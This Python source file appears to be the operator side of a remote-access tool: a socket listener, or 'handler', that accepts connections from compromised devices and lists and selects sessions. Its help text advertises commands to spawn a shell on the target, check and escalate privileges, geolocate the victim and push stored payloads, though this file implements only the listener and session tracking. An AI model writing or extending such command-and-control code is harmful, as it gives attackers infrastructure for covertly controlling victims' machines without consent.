"""imports"""
import json
import os
import sys
from subprocess import run
from threading import Thread
from socket import socket, AF_INET, SOCK_STREAM
from _socket import SO_REUSEADDR, SOL_SOCKET
from time import sleep
from prompt_toolkit import prompt

input = prompt

# webserver tracker
n = 0
# lets get the variables


def clear():
    run(['clear'])

term = sys.argv[1]

cwd = os.getcwd()
with open(".data/data.json") as file:
    variableDict = json.load(file)
    file.close()

"""global variables"""
host = "0.0.0.0" if input(f'Do you what to listen on all interfaces: ').startswith("y") else variableDict["L_HOST"]
port = int(variableDict["L_PORT"])

server = socket(AF_INET, SOCK_STREAM)
server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
server.bind((host, port))
server.listen()

"""For connection tracking"""
clients = []
clientIds = []

'''send request format
active-check ['200', 'respond']
'''

try:
    class Network:

        def use(self):
            """Reconnect to a device that has been stored"""
            try:
                # device index is passed by parent method
                device = int(self.string)
                # set a variable linked to the device that what's to be used
                a = clients[device]

                while True:
                    print('loading')
                    sleep(2)
                    os.system("clear")
                    menu = input(f'[*] session on {clientIds[device]}: ')

                    if menu == "help":
                        os.system("clear")
                        input("""Showing help for session handler
    Commands
        check     - See if the device is still active
        shell     - Spawn a shell on the target device
        priv      - Get effective user ID of session
        escalate  - Attempt to escalate privileges "no exploit uses sudo just to test"
        locate    - Geographically locate using https://ipinfo.io/
        payload   - Send what ever is stored in the payload value
        close     - Close session and return to handler menu
        back      - Return to handler menu

    Press enter to continue""")
            except Exception as e:
                print(e)

        @classmethod
        def show(cls):
            n = 0
            run(["clear"])
            print('Socket connections')
            for a in clients:
                print(f"{n}: {a}\n")
                n += 1
            print('\n\nAddresses')
            n = 0
            for b in clientIds:
                print(f'{n}: {b}\n')
                n += 1

        @classmethod
        def broadcast(cls, message):
            for client in clients:
                try:
                    client.send(message)
                except OSError as e:
                    print(f'[!] Error when connection to {clientIds[clients.index(client)]}.\n   [Error Report]\n{e}')
                    return False
            return True

        @classmethod
        def handle(cls, client):
            if client in clients:
                if client.recv(1024) == b'200':
                    try:
                        client.send(b'200')
                        return True
                    except OSError:
                        return False
            return True

        @classmethod
        def __inback__(cls):
            try:
                client, clientAddress = server.accept()
                print(f'\n[!] Connected to {str(clientAddress[0])}')
                clientIds.append(clientAddress[0])
                clients.append(client)
                thread = Thread(target=cls.handle, args=(client,))
                thread.start()
                return True
            except OSError as e:
                print(e)
                return False

        @classmethod
        def receive(cls):
            print(f'[*] Server Started on port {variableDict["L_PORT"]}')
            while True:
                try:
                    if cls.__inback__():
                        continue
                except OSError as e:
                    print(e)
                    return True

        def setVals(self, val):
            self.string = val
            return


    def Help():
        input('''
    Help Section For Handler

    start: start handler server

    show: shows connected sessions

    use: selects a connected session
        [Usage]:
            use [index of connection in list]

    webserver: starts the webserver for encrypted payloads

    Press enter to return
    ''')


    def mainMenu():
        while True:
            inputs = ['start', 'show', 'use', 'clear', 'help']
            functions = [Network.receive, Network.show, Network.use, clear, Help]
            a = input('[Handler]: ')
            if "use" in a:
                aa = Network()
                aa.setVals(a.split(" ")[1])
                aa.use()
            data = a
            for x in inputs:
                if data == x:
                    funIndex = inputs.index(x)
                    if funIndex == 0:
                        a = Thread(target=Network.receive)
                        a.start()
                        data = None
                        a = None
                        continue
                    else:
                        for x in inputs:
                            if data in x:
                                functions[inputs.index(x)]()
                                continue
                else:
                    continue
            continue
    mainMenu()
except Exception as e:
    input(str(e))
    server.close()
    sys.exit()

